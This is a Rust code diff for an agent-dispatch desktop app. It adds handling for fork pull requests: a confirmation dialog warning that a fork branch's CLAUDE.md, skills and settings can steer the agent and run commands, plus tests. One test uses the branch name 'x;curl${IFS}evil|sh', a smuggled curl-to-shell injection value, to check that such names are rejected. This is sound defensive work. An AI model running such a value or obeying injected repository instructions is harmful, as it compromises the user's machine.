@@ -13,11 +13,12 @@ use std::time::{Duration, Instant};
 use codescope_core::agents::claude::live_session;
 use codescope_core::board::dispatch::{
     FINDINGS_FILE, Facts, Hold, OwnPullRequest, PostedFindings, ProjectRemotes, REPLY_FILE,
-    ReviewRound, Round, StatusChange, WorktreeDispatch, add_dispatch_worktree,
+    ReviewRound, Round, StatusChange, WorktreeDispatch, add_dispatch_worktree, add_fork_worktree,
     add_pull_request_worktree, branch_name, clear_findings, clear_reply, counts_towards_limit,
-    decide, exclude_handover_files, fetch_branch_head, find_skill, launch_with_task,
-    mover_to_check, moves_to_needs_decision, opened_by, projects_for_repository, task_file,
-    task_message, trigger_content_ids, write_task_file,
+    decide, exclude_handover_files, fetch_branch_head, fetch_pull_head, find_skill, fork_branch,
+    fork_push, is_plain_branch, launch_with_task, mover_to_check, moves_to_needs_decision,
+    opened_by, projects_for_repository, set_fork_push, task_file, task_message,
+    trigger_content_ids, write_task_file,
 };
 use codescope_core::board::answers::{
     Answer, Comment, after_findings, answer_body, answers_section, choices_text, chosen,
@@ -46,6 +47,7 @@ use codescope_terminal::TerminalView;
 use gpui::{App, AppContext as _, Context, Entity, SharedString, Window};
 
 use super::{AppShell, ToastKind};
+use crate::dialogs::confirm::ConfirmSpec;
 use crate::dialogs::new_worktree::sanitize_branch_to_folder;
 use crate::notifications::NotificationKind;
 
@@ -73,6 +75,8 @@ pub(crate) struct DispatchState {
     starting: HashMap<String, Round>,
     /// Item id → the move that failed to start, and why.
     failed: HashMap<String, (String, String)>,
+    /// Item id → the move of a fork's pull request the user confirmed starting.
+    fork_confirmed: HashMap<String, String>,
     holds: HashMap<String, Hold>,
     /// Rounds whose findings are being posted.
     posting: HashSet<RoundKey>,
@@ -543,6 +547,7 @@ impl CardNote {
 pub(crate) enum CardAction {
     Decide,
     ReadyForReview,
+    StartFromFork,
 }
 
 #[derive(Clone, Copy, PartialEq, Eq)]
@@ -930,12 +935,20 @@ fn answers_for_task(job: &Job, from: &AnswersFrom) -> String {
 }
 
 fn prepare_worktree(job: &mut Job) -> anyhow::Result<()> {
+    let number = job.record.number;
+    let from_fork = job.record.fork.is_some();
     if job.create {
-        let add = match job.record.kind {
-            ItemKind::PullRequest => add_pull_request_worktree,
-            ItemKind::Issue | ItemKind::Draft => add_dispatch_worktree,
-        };
-        add(&job.repo, &job.path, &job.branch, &job.remote)?;
+        let (repo, path, branch, remote) = (&job.repo, &job.path, &job.branch, &job.remote);
+        match job.record.kind {
+            ItemKind::PullRequest if from_fork => {
+                add_fork_worktree(repo, path, branch, remote, number)?
+            }
+            ItemKind::PullRequest => add_pull_request_worktree(repo, path, branch, remote)?,
+            ItemKind::Issue | ItemKind::Draft => add_dispatch_worktree(repo, path, branch, remote)?,
+        }
+    }
+    if let Some(fork) = &job.record.fork {
+        set_fork_push(&job.repo, &job.branch, number, fork)?;
     }
     exclude_handover_files(&job.path)?;
     match job.record.round {
@@ -944,7 +957,11 @@ fn prepare_worktree(job: &mut Job) -> anyhow::Result<()> {
             clear_reply(&job.path)?;
             match job.record.kind {
                 ItemKind::PullRequest => {
-                    let head = fetch_branch_head(&job.repo, &job.remote, &job.branch)?;
+                    let head = if from_fork {
+                        fetch_pull_head(&job.repo, &job.remote, number)?
+                    } else {
+                        fetch_branch_head(&job.repo, &job.remote, &job.branch)?
+                    };
                     if let Some(review) = job.record.review.as_mut() {
                         review.start_head = Some(head);
                     }
@@ -1121,7 +1138,13 @@ impl AppShell {
     ) -> Option<Place> {
         let number = item.number?;
         let new_branch = match item.kind {
-            ItemKind::PullRequest => head.map(|head| head.branch.clone()),
+            ItemKind::PullRequest => head.map(|head| {
+                if head.is_cross_repository {
+                    fork_branch(number, head)
+                } else {
+                    head.branch.clone()
+                }
+            }),
             ItemKind::Issue | ItemKind::Draft => Some(branch_name(number, &item.title)),
         };
         let existing = self
@@ -1241,6 +1264,7 @@ impl AppShell {
                     branch: worktree.and_then(|(_, _, branch, _)| branch.as_deref()),
                     head,
                     opened_by: opener,
+                    fork_confirmed: state.fork_confirmed.get(&item.id).map(String::as_str),
                     running,
                     limit,
                 };
@@ -1337,8 +1361,16 @@ impl AppShell {
         };
         let matched = projects_for_repository(&self.board.dispatch.remotes, &repository)
             .first()
-            .map(|(project, remote)| (project.project_id.clone(), remote.to_string()));
-        let Some((project_id, remote)) = matched else {
+            .map(|(project, remote)| {
+                let url = project
+                    .remotes
+                    .iter()
+                    .find(|(name, _)| name.as_str() == *remote)
+                    .map(|(_, url)| url.clone())
+                    .unwrap_or_default();
+                (project.project_id.clone(), remote.to_string(), url)
+            });
+        let Some((project_id, remote, remote_url)) = matched else {
             return;
         };
         let Some(project) = self.current_projects(cx).project(&project_id).cloned() else {
@@ -1425,6 +1457,10 @@ impl AppShell {
             start_head: open.map(|pr| pr.head_oid.clone()),
             ..ReviewRound::default()
         });
+        let fork = head
+            .as_ref()
+            .filter(|head| head.is_cross_repository)
+            .map(|head| fork_push(head, &remote_url));
         let mut title = codescope_core::TabTitle::project(project.name.clone());
         title.set_branch(&branch);
         let launch = Launch {
@@ -1454,6 +1490,7 @@ impl AppShell {
                 findings: None,
                 pull_request,
                 review,
+                fork,
             },
             assign_to: item.assignees.is_empty().then_some(content_id),
             board,
@@ -1462,6 +1499,7 @@ impl AppShell {
             known_access: fresh_access(&self.board.dispatch.access),
         };
         self.board.dispatch.readied.remove(&item.id);
+        self.board.dispatch.fork_confirmed.remove(&item.id);
         self.board.dispatch.starting.insert(item.id.clone(), round);
         self.board.dispatch.failed.remove(&item.id);
         cx.notify();
@@ -2562,6 +2600,44 @@ impl AppShell {
         );
     }
 
+    /// Ask whether to start fork pull request `item_id` on its last move, and start it on yes.
+    pub(crate) fn confirm_fork_start(
+        &mut self,
+        item_id: &str,
+        window: &mut Window,
+        cx: &mut Context<Self>,
+    ) {
+        let found = self.board.reads_by_url.values().find_map(|read| {
+            let (board, triggers) = (read.last_good.as_ref()?, read.triggers.as_ref()?);
+            let item = board.items.iter().find(|item| item.id == item_id)?;
+            let content_id = item.content_id.as_ref()?;
+            let head = triggers.heads.get(content_id)?.clone();
+            let moved_at = triggers.changes.get(content_id)?.created_at.clone();
+            Some((item.number?, head, moved_at))
+        });
+        let Some((number, head, moved_at)) = found else {
+            return;
+        };
+        let (title, message, detail) = fork_warning(number, &head);
+        let spec = ConfirmSpec::confirm(title, message)
+            .with_detail(detail)
+            .with_confirm_label("Start")
+            .with_cancel_label("Not now");
+        let answer = self.open_confirm_dialog(spec, window, cx);
+        let item_id = item_id.to_string();
+        cx.spawn_in(window, async move |this, cx| {
+            if !answer.await.unwrap_or(false) {
+                return;
+            }
+            let _ = this.update_in(cx, |this, window, cx| {
+                this.board.dispatch.fork_confirmed.insert(item_id, moved_at);
+                this.run_dispatch(window, cx);
+                cx.notify();
+            });
+        })
+        .detach();
+    }
+
     /// Mark the draft pull request of `item_id` ready for review; the next watch moves the item
     /// to In review.
     pub(crate) fn ready_for_review(&mut self, item_id: &str, cx: &mut Context<Self>) {
@@ -2682,7 +2758,7 @@ impl AppShell {
         }
         for (item_id, hold) in &state.holds {
             if !hold.is_quiet() {
-                notes.insert(item_id.clone(), CardNote::new(hold.label(), NoteTone::Waiting));
+                notes.insert(item_id.clone(), hold_note(hold));
             }
         }
         for (item_id, (_, message)) in &state.failed {
@@ -2851,6 +2927,46 @@ pub(crate) fn work_after_research(kind: ItemKind) -> &'static str {
         ItemKind::PullRequest => "a review",
         ItemKind::Issue | ItemKind::Draft => "implementation",
     }
+}
+
+/// The card line of an item that waits.
+fn hold_note(hold: &Hold) -> CardNote {
+    match hold {
+        Hold::FromFork => CardNote {
+            action: Some(CardAction::StartFromFork),
+            ..CardNote::new(hold.label(), NoteTone::NeedsYou)
+        },
+        _ => CardNote::new(hold.label(), NoteTone::Waiting),
+    }
+}
+
+/// The title, warning and push line of the dialog that starts fork pull request `number`.
+fn fork_warning(number: u32, head: &PullRequestHead) -> (String, String, String) {
+    let from = match &head.repository {
+        Some(repository) => format!("Its branch comes from {repository}."),
+        None => "Its branch comes from a fork that is gone.".to_string(),
+    };
+    let message = format!(
+        "{from} The agent works in a checkout of it, so the CLAUDE.md, skills and settings on \
+         that branch steer it and can run commands on this computer. Look at what the pull \
+         request changes in them first."
+    );
+    let reply_only = "so the round can only reply.";
+    let detail = match &head.repository {
+        None => format!("Its fork is gone, {reply_only}"),
+        Some(_) if !head.maintainer_can_modify => {
+            format!("Its author doesn't allow edits by maintainers, {reply_only}")
+        }
+        Some(_) if !is_plain_branch(&head.branch) => format!(
+            "Its branch name has characters CodeScope doesn't put in a command, {reply_only}"
+        ),
+        Some(repository) => format!(
+            "Its author allows edits by maintainers, so the agent can push to {} in \
+             {repository}.",
+            head.branch
+        ),
+    };
+    (format!("Start #{number} from a fork?"), message, detail)
 }
 
 /// The card line of research that posted decision points: what to decide, or who answered.
@@ -3259,6 +3375,59 @@ mod tests {
     }
 
     #[test]
+    fn a_fork_s_card_offers_to_start_it() {
+        let note = hold_note(&Hold::FromFork);
+        assert!(note.tone == NoteTone::NeedsYou);
+        assert!(note.action == Some(CardAction::StartFromFork));
+        let other = hold_note(&Hold::NoMove);
+        assert!(other.tone == NoteTone::Waiting && other.action.is_none());
+    }
+
+    #[test]
+    fn starting_a_fork_s_pull_request_warns_what_its_branch_can_do() {
+        let head = PullRequestHead {
+            branch: "main".into(),
+            is_cross_repository: true,
+            repository: Some("octo/CodeScope".into()),
+            maintainer_can_modify: true,
+        };
+        let (title, message, detail) = fork_warning(421, &head);
+        assert_eq!(title, "Start #421 from a fork?");
+        assert!(message.starts_with("Its branch comes from octo/CodeScope."), "{message}");
+        assert!(message.contains("CLAUDE.md"), "{message}");
+        assert!(message.contains("can run commands on this computer"), "{message}");
+        assert_eq!(
+            detail,
+            "Its author allows edits by maintainers, so the agent can push to main in \
+             octo/CodeScope."
+        );
+        let closed = PullRequestHead {
+            maintainer_can_modify: false,
+            ..head.clone()
+        };
+        assert_eq!(
+            fork_warning(421, &closed).2,
+            "Its author doesn't allow edits by maintainers, so the round can only reply."
+        );
+        let gone = PullRequestHead {
+            repository: None,
+            ..head
+        };
+        let (_, message, detail) = fork_warning(421, &gone);
+        assert!(message.starts_with("Its branch comes from a fork that is gone."), "{message}");
+        assert_eq!(detail, "Its fork is gone, so the round can only reply.");
+        let odd = PullRequestHead {
+            branch: "x;curl${IFS}evil|sh".into(),
+            ..closed
+        };
+        assert_eq!(
+            fork_warning(421, &PullRequestHead { maintainer_can_modify: true, ..odd }).2,
+            "Its branch name has characters CodeScope doesn't put in a command, so the round \
+             can only reply."
+        );
+    }
+
+    #[test]
     fn decision_points_on_a_pull_request_item_are_answered_there() {
         let item = ItemKind::PullRequest;
         let mut discussion = Discussion {
@@ -3331,6 +3500,7 @@ mod tests {
             findings: None,
             pull_request,
             review: None,
+            fork: None,
         }
     }
 
